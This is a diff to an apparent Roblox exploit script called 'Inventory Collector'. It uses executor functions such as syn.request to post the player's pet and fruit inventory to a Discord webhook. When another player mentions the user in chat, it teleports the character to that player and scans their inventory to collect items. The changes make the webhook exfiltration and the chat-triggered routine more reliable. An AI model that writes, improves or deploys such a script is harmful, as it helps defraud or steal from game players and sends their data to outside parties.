@@ -24,11 +24,13 @@ local function monitorToolRemoval()
         toolRemovedConn:Disconnect()
     end
     
-    toolRemovedConn = LocalPlayer.Character.ChildRemoved:Connect(function(child)
-        if child == currentTool then
-            currentTool = nil
-        end
-    end)
+    if LocalPlayer.Character then
+        toolRemovedConn = LocalPlayer.Character.ChildRemoved:Connect(function(child)
+            if child == currentTool then
+                currentTool = nil
+            end
+        end)
+    end
 end
 
 -- Inventory scanner with priority sorting
@@ -97,8 +99,8 @@ local function scanInventory(player)
     return pets, fruits
 end
 
--- Send initial inventory to Discord
-local function sendInitialInventory()
+-- Send MY inventory to Discord
+local function sendMyInventory()
     local pets, fruits = scanInventory(LocalPlayer)
     
     -- Format pets
@@ -137,30 +139,53 @@ local function sendInitialInventory()
         }
     }
     
-    pcall(function()
-        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({
-            embeds = {embed}
-        }))
+    -- Try different webhook methods
+    local success, err = pcall(function()
+        local json = HttpService:JSONEncode({embeds = {embed}})
+        if syn and syn.request then
+            syn.request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = json
+            })
+        elseif request then
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = json
+            })
+        else
+            HttpService:PostAsync(WEBHOOK_URL, json)
+        end
     end)
+    
+    if not success then
+        warn("Webhook failed:", err)
+    else
+        print("✅ Inventory sent to Discord!")
+    end
 end
 
--- Collect items from target player
-local function collectFromTarget(targetPlayer)
-    local targetChar = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
+-- Collect items from player who mentioned me
+local function collectFromMentioner(mentionerPlayer)
+    local targetChar = mentionerPlayer.Character or mentionerPlayer.CharacterAdded:Wait()
     local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     local humanoid = myChar:FindFirstChildOfClass("Humanoid")
-    
+    if not humanoid then return end
+
     -- Max zoom out
     LocalPlayer.CameraMaxZoomDistance = 100
     LocalPlayer.CameraMinZoomDistance = 100
     LocalPlayer.CameraMode = Enum.CameraMode.Classic
-    
+
     -- Position in front of target
     humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
     myChar:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
-    
-    -- Get sorted inventory
-    local pets, fruits = scanInventory(targetPlayer)
+
+    -- Get their sorted inventory
+    local pets, fruits = scanInventory(mentionerPlayer)
     local allItems = {}
     
     -- Add pets first
@@ -208,15 +233,26 @@ end
 -- Chat handler
 local function onPlayerChatted(player, message)
     if player == LocalPlayer then return end
-    if not message:lower():match("@%s*"..LocalPlayer.Name:lower()) then return end
     
-    collectFromTarget(player)
+    -- Check for @mention (flexible matching)
+    local lowerMsg = message:lower()
+    local lowerName = LocalPlayer.Name:lower()
+    if not lowerMsg:match("@%s*"..lowerName) then
+        return
+    end
+    
+    print("📢 Mention detected from", player.Name)
+    collectFromMentioner(player)
 end
 
 -- Initialize
 local function main()
-    -- Send initial inventory
-    sendInitialInventory()
+    -- Wait for everything to load
+    LocalPlayer.CharacterAdded:Wait()
+    LocalPlayer.Backpack:WaitForChild("ChildAdded", 10)
+    
+    -- Send MY inventory to Discord
+    sendMyInventory()
     
     -- Setup chat listeners
     for _, player in ipairs(Players:GetPlayers()) do
@@ -236,5 +272,10 @@ local function main()
     print("✅ Inventory Collector Active! Waiting for mentions...")
 end
 
--- Start
-pcall(main)
+-- Start with retry
+local success, err = pcall(main)
+if not success then
+    warn("Initial error:", err)
+    task.wait(5)
+    pcall(main) -- Try again after delay
+end
